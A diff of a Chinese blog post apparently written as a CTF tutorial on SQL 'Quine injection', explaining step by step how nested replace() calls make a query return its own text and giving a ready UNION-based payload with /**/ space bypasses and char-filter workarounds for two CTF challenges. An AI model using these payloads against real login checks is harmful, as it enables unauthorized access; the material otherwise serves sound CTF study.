@@ -107,92 +107,66 @@
 </div>
       <p><strong>最近做到一道题，需要用到Quine注入，感觉不太好理解，于是打算写一篇博客详细记录一下。</strong></p>
 <span id="more"></span>
-
 <h1 id="Quine注入详解"><a href="#Quine注入详解" class="headerlink" title="Quine注入详解"></a>Quine注入详解</h1><p>在<code>sql</code>注入技术中，Quine是一种使得输入的<code>sql</code>语句和输出的<code>sql</code>语句一致的技术。</p>
 <p>Quine注入主要用到的是replace()函数。</p>
 <h2 id="一、首先了解一下replace-函数"><a href="#一、首先了解一下replace-函数" class="headerlink" title="一、首先了解一下replace()函数"></a>一、首先了解一下replace()函数</h2><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">REPLACE(string_expression , string_pattern , string_replacement)</span><br><span class="line">#string_expression是待处理的字符串表达式(字符或二进制数据)</span><br><span class="line">#string_pattern是要查找的子字符串(字符或二进制数据，但是不能为空)</span><br><span class="line">#string_replacement是用来替换的字符串(字符或二进制数据)</span><br></pre></td></tr></table></figure>
-
 <p>Tips：在标准SQL中，字符串使用的是单引号</p>
 <p>​            如果字符串本身包含单引号，则要使用两个单引号，但是字符串中的双引号不需要另外转义</p>
 <h2 id="二、开始介绍Quine注入"><a href="#二、开始介绍Quine注入" class="headerlink" title="二、开始介绍Quine注入"></a>二、开始介绍Quine注入</h2><p>Quine的基本形式：</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REPLACE(str,编码的间隔符,str)</span><br></pre></td></tr></table></figure>
-
 <p>参数str的基本形式：</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REPLACE(间隔符,编码的间隔符,间隔符)</span><br></pre></td></tr></table></figure>
-
 <p>首先先看这样一个例子</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> replace(&quot;.&quot;,<span class="type">char</span>(<span class="number">46</span>),&quot;.&quot;);# <span class="type">char</span>(<span class="number">46</span>)就是.</span><br></pre></td></tr></table></figure>
-
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">+---------------------------+</span><br><span class="line">| replace(&quot;.&quot;,char(46),&quot;.&quot;) |</span><br><span class="line">+---------------------------+</span><br><span class="line">| .                         |</span><br><span class="line">+---------------------------+</span><br></pre></td></tr></table></figure>
-
 <p>该语句将待处理字符串中的”.”替换为”.”，然后输入了替换后的结果</p>
 <p>那如果我们把待处理的字符串改为’select replace(“.”,char(46),”.”)’</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> replace(<span class="string">&#x27;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#x27;</span>,<span class="type">char</span>(<span class="number">46</span>),&quot;.&quot;);</span><br></pre></td></tr></table></figure>
-
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">+---------------------------------------------------+</span><br><span class="line">| replace(&#x27;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#x27;,char(46),&quot;.&quot;) |</span><br><span class="line">+---------------------------------------------------+</span><br><span class="line">| replace(&quot;.&quot;,char(46),&quot;.&quot;)                         |</span><br><span class="line">+---------------------------------------------------+</span><br></pre></td></tr></table></figure>
-
 <p>我们就会得到以上的结果，语句把’select replace(“.”,char(46),”.”)’当成 了一个字符串进行处理</p>
 <p>倘若我们更近一步，把用来替换的字符串也改为’replace(“.”,char(46),”.”)’，</p>
 <p>即 str：replace(“间隔符”,编码的间隔符,”间隔符”)</p>
 <p>这里<code>str</code>中的间隔符号用双引号包裹是因为<code>str</code>已经被单引号包裹，</p>
 <p>为避免引号匹配问题引入新的转义符号，间隔符需要使用双引号</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> replace(<span class="string">&#x27;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#x27;</span>,<span class="type">char</span>(<span class="number">46</span>),<span class="string">&#x27;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#x27;</span>);</span><br></pre></td></tr></table></figure>
-
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">+---------------------------------------------------------------------------+</span><br><span class="line">| replace(&#x27;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#x27;,char(46),&#x27;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#x27;) |</span><br><span class="line">+---------------------------------------------------------------------------+</span><br><span class="line">| replace(&quot;replace(&quot;.&quot;,char(46),&quot;.&quot;)&quot;,char(46),&quot;replace(&quot;.&quot;,char(46),&quot;.&quot;)&quot;) |</span><br><span class="line">+---------------------------------------------------------------------------+</span><br></pre></td></tr></table></figure>
-
 <p>这个时候我们发现，输出的内容和我们输入的内容已经有点类似了，就剩下了四个单/双引号上的区别</p>
 <p>为了让输出的内容和输入完全相同，我们还要想办法把这四个引号给替换了，就是里面再套个replace()</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#此时Quine的形式</span><br><span class="line">REPLACE(REPLACE(<span class="string">&#x27;str&#x27;</span>,<span class="type">CHAR</span>(<span class="number">34</span>),<span class="type">CHAR</span>(<span class="number">39</span>)),编码的间隔符,<span class="string">&#x27;str&#x27;</span>)</span><br><span class="line">#此时str的形式</span><br><span class="line">REPLACE(REPLACE(&quot;间隔符&quot;,<span class="type">CHAR</span>(<span class="number">34</span>),<span class="type">CHAR</span>(<span class="number">39</span>)),编码的间隔符,&quot;间隔符&quot;)</span><br></pre></td></tr></table></figure>
-
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> replace(replace(<span class="string">&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;</span>,<span class="type">char</span>(<span class="number">34</span>),<span class="type">char</span>(<span class="number">39</span>)),<span class="type">char</span>(<span class="number">46</span>),<span class="string">&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;</span>);</span><br></pre></td></tr></table></figure>
-
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">+------------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">| replace(replace(&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;,char(34),char(39)),char(46),&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;) |</span><br><span class="line">+------------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">| replace(replace(&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;,char(34),char(39)),char(46),&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;) |</span><br><span class="line">+------------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br></pre></td></tr></table></figure>
-
 <p>整个一起看肯定不好看，我们拆出来一个个进行分析</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> replace(<span class="string">&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;</span>,<span class="type">char</span>(<span class="number">34</span>),<span class="type">char</span>(<span class="number">39</span>));</span><br></pre></td></tr></table></figure>
-
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">+-----------------------------------------------------------------------------------+</span><br><span class="line">| replace(&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;,char(34),char(39)) |</span><br><span class="line">+-----------------------------------------------------------------------------------+</span><br><span class="line">| replace(replace(&#x27;.&#x27;,char(34),char(39)),char(46),&#x27;.&#x27;)                              |</span><br><span class="line">+-----------------------------------------------------------------------------------+</span><br></pre></td></tr></table></figure>
-
 <p>即第一层运行可以得到</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> replace(<span class="string">&#x27;replace(replace(&#x27;</span>.<span class="string">&#x27;,char(34),char(39)),char(46),&#x27;</span>.<span class="string">&#x27;)&#x27;</span>,<span class="type">char</span>(<span class="number">46</span>),<span class="string">&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;</span>);</span><br></pre></td></tr></table></figure>
-
 <p>因为此时字符串本身也包含单引号，所以要用单引号来对内层的单引号进行转义</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> replace(<span class="string">&#x27;replace(replace(&#x27;&#x27;.&#x27;&#x27;,char(34),char(39)),char(46),&#x27;&#x27;.&#x27;&#x27;)&#x27;</span>,<span class="type">char</span>(<span class="number">46</span>),<span class="string">&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;</span>);</span><br></pre></td></tr></table></figure>
-
 <p>运行第二层可以得到</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">+------------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">| replace(&#x27;replace(replace(&#x27;&#x27;.&#x27;&#x27;,char(34),char(39)),char(46),&#x27;&#x27;.&#x27;&#x27;)&#x27;,char(46),&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;)                        |</span><br><span class="line">+------------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">| replace(replace(&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;,char(34),char(39)),char(46),&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;) |</span><br><span class="line">+------------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br></pre></td></tr></table></figure>
-
 <p>至此，我们大致就了解了Quine注入的原理</p>
 <p>Tips：如果char被过滤了，可以使用chr和0x绕过</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">char(34),char(39)</span><br><span class="line">chr(34),chr(39)</span><br><span class="line">0x22,0x27</span><br></pre></td></tr></table></figure>
-
 <h2 id="三、总结"><a href="#三、总结" class="headerlink" title="三、总结"></a>三、总结</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Quine的基本形式：</span><br><span class="line">1&#x27;/**/union/**/select/**/replace(replace(&#x27;&#x27;,char(34),char(39)),char(46),&#x27;&#x27;)#</span><br><span class="line">str的基本形式：</span><br><span class="line">1&quot;/**/union/**/select/**/replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#</span><br></pre></td></tr></table></figure>
-
 <h3 id="其他数据库中的Quine"><a href="#其他数据库中的Quine" class="headerlink" title="其他数据库中的Quine"></a>其他数据库中的Quine</h3><p><strong>SQL Server</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">SELECT Replace(Replace(</span><br><span class="line">&#x27;SELECT REPLACE(REPLACE(&quot;$&quot;,CHAR(34),CHAR(39)),CHAR(36),&quot;$&quot;) AS Quine&#x27;,</span><br><span class="line">Char(34), Char(39)), Char(36),</span><br><span class="line">&#x27;SELECT REPLACE(REPLACE(&quot;$&quot;,CHAR(34),CHAR(39)),CHAR(36),&quot;$&quot;) AS Quine&#x27;)</span><br><span class="line">AS Quine</span><br><span class="line"></span><br><span class="line">DECLARE @ CHAR(65)=&#x27;DECLARE @ CHAR(65)=#PRINT REPLACE(@,CHAR(35),CHAR(39)+@+CHAR(39))&#x27;PRINT REPLACE(@,CHAR(35),CHAR(39)+@+CHAR(39))</span><br></pre></td></tr></table></figure>
-
 <p><strong>Oracle</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">SELECT Replace(Replace(</span><br><span class="line">&#x27;SELECT REPLACE(REPLACE(&quot;$&quot;,CHAR(34),CHAR(39)),CHAR(36),&quot;$&quot;) AS Quine&#x27;,</span><br><span class="line">Char(34), Char(39)), Char(36),</span><br><span class="line">&#x27;SELECT REPLACE(REPLACE(&quot;$&quot;,CHAR(34),CHAR(39)),CHAR(36),&quot;$&quot;) AS Quine&#x27;)</span><br><span class="line">AS Quine</span><br><span class="line"></span><br><span class="line">select</span><br><span class="line">substr(rpad(1,125,&#x27;||chr(39)),26)from dual;select</span><br><span class="line">substr(rpad(1,125,&#x27;||chr(39)),26)from dual;</span><br></pre></td></tr></table></figure>
-
 <p><strong>PostgreSQL</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT left(A.v, 81) || chr(39) || A.v || chr(39) || right(A.v, 12) FROM (SELECT &#x27;SELECT left(A.v, 81) || chr(39) || A.v || chr(39) || right(A.v, 12) FROM (SELECT AS v) AS A;&#x27; AS v) AS A;</span><br></pre></td></tr></table></figure>
-
 <p><strong>Snowflake</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT CURRENT_STATEMENT();</span><br></pre></td></tr></table></figure>
-
 <h2 id="四、例题"><a href="#四、例题" class="headerlink" title="四、例题"></a>四、例题</h2><h3 id="1-2021-第五空间智能安全大赛-Web-yet-another-mysql-injection（quine注入）"><a href="#1-2021-第五空间智能安全大赛-Web-yet-another-mysql-injection（quine注入）" class="headerlink" title="1.2021-第五空间智能安全大赛-Web-yet_another_mysql_injection（quine注入）"></a>1.2021-第五空间智能安全大赛-Web-yet_another_mysql_injection（quine注入）</h3><p><strong>payload</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;/**/union/**/select/**/replace(replace(&#x27;1&quot;/**/union/**/select/**/replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#&#x27;,char(34),char(39)),char(46),&#x27;1&quot;/**/union/**/select/**/replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#&#x27;)#</span><br></pre></td></tr></table></figure>
-
 <h3 id="2、2023-HDCTF-Yamiyami"><a href="#2、2023-HDCTF-Yamiyami" class="headerlink" title="2、2023-HDCTF-Yamiyami"></a>2、2023-HDCTF-Yamiyami</h3><p><strong>payload和上题相同</strong></p>
 <h2 id="五、扩展"><a href="#五、扩展" class="headerlink" title="五、扩展"></a>五、扩展</h2><p><strong>Python3中Quine的例子</strong></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="string">&#x27;a = &#123;&#125;&#123;&#125;&#123;&#125;; print(a.format(chr(39), a, chr(39)))&#x27;</span>; <span class="built_in">print</span>(a.<span class="built_in">format</span>(<span class="built_in">chr</span>(<span class="number">39</span>), a, <span class="built_in">chr</span>(<span class="number">39</span>)))</span><br><span class="line"><span class="comment">#%r是一个万能的格式付，它会将后面给的参数原样打印出来，带有类型信息</span></span><br><span class="line">c = <span class="string">&#x27;c = %r; print(c %% c)&#x27;</span>; <span class="built_in">print</span>(c % c)</span><br><span class="line"><span class="built_in">exec</span>(s:=<span class="string">&#x27;print(&quot;exec(s:=%r)&quot;%s)&#x27;</span>)</span><br></pre></td></tr></table></figure>
-
 <h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/zhengna/p/15917521.html">CTFHub_2021-第五空间智能安全大赛-Web-yet_another_mysql_injection（quine注入） - zhengna - 博客园 (cnblogs.com)</a></p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://goodlunatic.github.io/2023/07/04/Quine%20Injection/" data-id="cltux1tv1003ros3z3wde7b89" class="article-share-link">Share</a>
+      <a data-url="https://goodlunatic.github.io/2023/07/04/Quine%20Injection/" data-id="cltv84kc6004g343zfcsbfc1q" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/" rel="tag">Web</a></li></ul>
@@ -250,7 +224,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/03/">March 2024</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/02/">February 2024</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/01/">January 2024</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/12/">December 2023</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/11/">November 2023</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/10/">October 2023</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/09/">September 2023</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/08/">August 2023</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/07/">July 2023</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/06/">June 2023</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/05/">May 2023</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/04/">April 2023</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/03/">March 2023</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/02/">February 2023</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/01/">January 2023</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/12/">December 2022</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/11/">November 2022</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/08/">August 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/04/">April 2022</a><span class="archive-list-count">1</span></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/03/">March 2024</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/02/">February 2024</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/01/">January 2024</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/12/">December 2023</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/11/">November 2023</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/10/">October 2023</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/09/">September 2023</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/08/">August 2023</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/07/">July 2023</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/06/">June 2023</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/05/">May 2023</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/04/">April 2023</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/03/">March 2023</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/02/">February 2023</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/01/">January 2023</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/12/">December 2022</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/11/">November 2022</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/08/">August 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/04/">April 2022</a><span class="archive-list-count">1</span></li></ul>
     </div>
   </div>
 
@@ -261,6 +235,10 @@
     <h3 class="widget-title">Recent Posts</h3>
     <div class="widget">
       <ul>
+        
+          <li>
+            <a href="/2024/03/17/CTF%E2%80%94%E2%80%94Crypto/">CTF——Crypto</a>
+          </li>
         
           <li>
             <a href="/2024/03/17/2024-VCTF-Misc-Writeup/">2024-VCTF-Misc-Writeup</a>
@@ -276,10 +254,6 @@
         
           <li>
             <a href="/2024/02/17/%E4%B8%80%E6%96%87%E5%B8%A6%E4%BD%A0%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3%E9%85%8D%E9%95%9C%E8%A1%8C%E4%B8%9A/">一文带你深入了解配镜行业</a>
-          </li>
-        
-          <li>
-            <a href="/2024/02/10/CTF%E2%80%94%E2%80%94Misc%20Guide/">CTF——Misc Guide</a>
           </li>
         
       </ul>
@@ -340,5 +314,20 @@
 
 <!-- Toc -->
   </div>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script src="//cdn.bootcss.com/mathjax/2.7.3/MathJax.js?config=TeX-MML-AM_CHTML"></script>
 </body>
 </html>
